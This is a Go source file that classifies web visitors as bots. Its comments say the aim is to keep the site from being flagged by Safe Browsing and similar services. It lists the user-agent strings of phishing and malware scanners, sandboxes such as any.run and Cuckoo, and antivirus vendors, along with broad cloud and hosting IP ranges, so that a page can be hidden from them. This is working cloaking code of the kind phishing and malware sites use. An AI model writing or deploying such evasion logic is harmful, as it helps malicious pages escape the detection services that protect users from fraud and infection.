package main

import (
	"net"
	"strings"
)

// isBot returns true if the request looks like a scanner/crawler that could
// flag the site on Safe Browsing or similar services.
func isBot(ip, ua string) bool {
	return isScannerUA(ua) || isBotIP(ip)
}

// isScannerUA detects security scanners, safe browsing crawlers, and similar
// threats specifically. Regular bots like Googlebot are less of a concern
// (robots.txt handles them), but security scanners will flag the page.
func isScannerUA(ua string) bool {
	if ua == "" {
		return false // empty UA is common on mobile, don't block
	}
	lower := strings.ToLower(ua)

	scannerKeywords := []string{
		"safebrowsing", "phishtank", "netcraft", "virustotal", "urlscan",
		"hybrid-analysis", "any.run", "joesandbox", "cuckoo", "cape",
		"triage", "malware", "fortinet", "sophos", "kaspersky",
		"bitdefender", "eset", "mcafee", "norton", "symantec",
		"trendmicro", "paloalto", "checkpoint", "crowdstrike",
		"sentinelone", "cylance", "carbon black", "fireeye",
		"proofpoint", "mimecast", "barracuda", "zscaler",
		"googlebot", "bingbot", "yandex", "baidu", "duckduckbot",
		"slurp", "ia_archiver", "archive.org",
		"facebookexternalhit", "twitterbot", "linkedinbot",
		"whatsapp", "telegrambot", "discordbot", "slackbot",
		"redditbot", "applebot", "semrush", "ahrefs",
		"screaming", "lighthouse", "pagespeed", "gtmetrix",
		"pingdom", "uptimerobot", "statuscake", "newrelic", "datadog",
		"python-requests", "python-urllib", "go-http-client",
		"java/", "okhttp", "apache-http", "wget",
		"headless", "phantom", "selenium", "puppeteer", "playwright",
		"curl/", "libwww", "lwp-trivial", "httpunit", "nutch",
		"biglotron", "teoma", "convera", "gigablast",
	}

	for _, kw := range scannerKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

// isBotUA checks if the user-agent indicates a bot/crawler.
func isBotUA(ua string) bool {
	if ua == "" {
		return true // no UA is suspicious
	}
	lower := strings.ToLower(ua)
	
	// Common bot/crawler keywords
	botKeywords := []string{
		"bot", "crawler", "spider", "scraper", "scan",
		"check", "monitor", "preview", "fetch", "curl",
		"wget", "python", "go-http", "java/", "okhttp",
		"apache-http", "axios", "node-fetch", "request",
		"headless", "phantom", "selenium", "puppeteer",
		"playwright", "lighthouse", "pagespeed", "gtmetrix",
		"pingdom", "uptimerobot", "statuscake", "newrelic",
		"datadog", "googlebot", "bingbot", "yandex", "baidu",
		"duckduckbot", "slurp", "ia_archiver", "archive.org",
		"facebookexternalhit", "twitterbot", "linkedinbot",
		"whatsapp", "telegrambot", "discordbot", "slackbot",
		"viber", "snapchat", "pinterest", "tumblr",
		"embedly", "quora", "redditbot", "applebot",
		"semrush", "ahrefs", "moz", "majestic", "screaming",
		"virustotal", "urlscan", "safebrowsing", "phishtank",
		"netcraft", "hybrid-analysis", "any.run", "joesandbox",
		"cuckoo", "cape", "triage", "malware", "security",
		"fortinet", "sophos", "kaspersky", "avast", "avg",
		"bitdefender", "eset", "mcafee", "norton", "symantec",
		"trendmicro", "paloalto", "checkpoint", "crowdstrike",
		"sentinelone", "cylance", "carbon black", "fireeye",
		"proofpoint", "mimecast", "barracuda", "cisco",
		"zscaler", "cloudflare", "imperva", "akamai",
		"fastly", "cloudfront", "aws", "azure", "gcloud",
	}
	
	for _, kw := range botKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

// isBotIP checks if the IP belongs to known cloud/bot ranges.
func isBotIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	
	// Known bot/cloud/scanner IP ranges (CIDR)
	botRanges := []string{
		// AWS
		"3.0.0.0/8",
		"13.0.0.0/8",
		"15.0.0.0/8",
		"18.0.0.0/8",
		"35.0.0.0/8",
		"52.0.0.0/8",
		"54.0.0.0/8",
		"99.0.0.0/8",
		"100.20.0.0/14",
		"107.20.0.0/14",
		"174.129.0.0/16",
		"184.72.0.0/15",
		"204.236.128.0/17",
		
		// Google Cloud
		"34.0.0.0/8",
		"35.184.0.0/13",
		"104.196.0.0/14",
		"108.170.192.0/18",
		"130.211.0.0/16",
		"142.250.0.0/15",
		"172.217.0.0/16",
		"173.194.0.0/16",
		"209.85.128.0/17",
		"216.58.192.0/19",
		"216.239.32.0/19",
		
		// Microsoft Azure
		"13.64.0.0/11",
		"20.0.0.0/8",
		"40.64.0.0/10",
		"51.0.0.0/8",
		"52.224.0.0/11",
		"65.52.0.0/14",
		"70.37.0.0/17",
		"104.40.0.0/13",
		"157.55.0.0/16",
		"168.61.0.0/16",
		"191.232.0.0/14",
		
		// DigitalOcean
		"104.131.0.0/16",
		"104.236.0.0/16",
		"138.68.0.0/16",
		"139.59.0.0/16",
		"159.65.0.0/16",
		"159.89.0.0/16",
		"161.35.0.0/16",
		"162.243.0.0/16",
		"165.22.0.0/16",
		"167.99.0.0/16",
		"178.62.0.0/16",
		"188.166.0.0/16",
		"206.189.0.0/16",
		
		// Linode
		"45.33.0.0/16",
		"45.56.0.0/16",
		"45.79.0.0/16",
		"50.116.0.0/16",
		"66.175.208.0/20",
		"69.164.192.0/18",
		"72.14.176.0/20",
		"74.207.224.0/19",
		"96.126.96.0/19",
		"97.107.128.0/17",
		"139.162.0.0/16",
		"172.104.0.0/15",
		"173.230.128.0/17",
		"173.255.192.0/18",
		"192.155.80.0/20",
		"198.58.96.0/19",
		
		// Vultr
		"45.32.0.0/15",
		"45.63.0.0/16",
		"45.76.0.0/15",
		"64.156.0.0/16",
		"64.237.32.0/19",
		"66.42.32.0/19",
		"78.141.192.0/18",
		"95.179.128.0/17",
		"104.156.224.0/19",
		"108.61.0.0/16",
		"136.244.64.0/18",
		"140.82.0.0/16",
		"144.202.0.0/16",
		"149.28.0.0/16",
		"155.138.128.0/17",
		"207.148.0.0/17",
		"209.222.0.0/17",
		"216.128.128.0/17",
		
		// OVH
		"51.38.0.0/16",
		"51.68.0.0/16",
		"51.75.0.0/16",
		"51.77.0.0/16",
		"51.79.0.0/16",
		"51.81.0.0/16",
		"51.83.0.0/16",
		"51.89.0.0/16",
		"51.91.0.0/16",
		"54.36.0.0/14",
		"54.37.0.0/16",
		"54.38.0.0/16",
		"57.128.0.0/14",
		"91.134.0.0/16",
		"92.222.0.0/16",
		"135.125.0.0/16",
		"137.74.0.0/16",
		"139.99.0.0/16",
		"141.94.0.0/15",
		"142.4.192.0/18",
		"144.217.0.0/16",
		"145.239.0.0/16",
		"147.135.0.0/16",
		"149.56.0.0/16",
		"151.80.0.0/16",
		"158.69.0.0/16",
		"164.132.0.0/16",
		"167.114.0.0/16",
		"176.31.0.0/16",
		"178.32.0.0/15",
		"185.15.68.0/22",
		"188.165.0.0/16",
		"192.95.0.0/16",
		"192.99.0.0/16",
		"193.70.0.0/16",
		"198.27.64.0/18",
		"198.50.128.0/17",
		"198.100.144.0/20",
		"198.245.48.0/20",
		"213.32.0.0/16",
		"213.186.32.0/19",
		"213.251.128.0/17",
		
		// Hetzner
		"5.9.0.0/16",
		"23.88.0.0/15",
		"46.4.0.0/16",
		"78.46.0.0/15",
		"85.10.192.0/18",
		"88.99.0.0/16",
		"88.198.0.0/16",
		"94.130.0.0/16",
		"95.216.0.0/15",
		"116.202.0.0/15",
		"116.203.0.0/16",
		"128.140.0.0/16",
		"135.181.0.0/16",
		"136.243.0.0/16",
		"138.201.0.0/16",
		"142.132.128.0/17",
		"144.76.0.0/16",
		"148.251.0.0/16",
		"157.90.0.0/16",
		"159.69.0.0/16",
		"162.55.0.0/16",
		"167.233.0.0/16",
		"168.119.0.0/16",
		"176.9.0.0/16",
		"178.63.0.0/16",
		"188.40.0.0/16",
		"195.201.0.0/16",
		"213.133.96.0/19",
		"213.239.192.0/18",
		
		// Cloudflare (scanners often use CF)
		"103.21.244.0/22",
		"103.22.200.0/22",
		"103.31.4.0/22",
		"104.16.0.0/13",
		"104.24.0.0/14",
		"108.162.192.0/18",
		"131.0.72.0/22",
		"141.101.64.0/18",
		"162.158.0.0/15",
		"172.64.0.0/13",
		"173.245.48.0/20",
		"188.114.96.0/20",
		"190.93.240.0/20",
		"197.234.240.0/22",
		"198.41.128.0/17",
	}
	
	for _, cidr := range botRanges {
		_, network, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if network.Contains(parsed) {
			return true
		}
	}
	return false
}
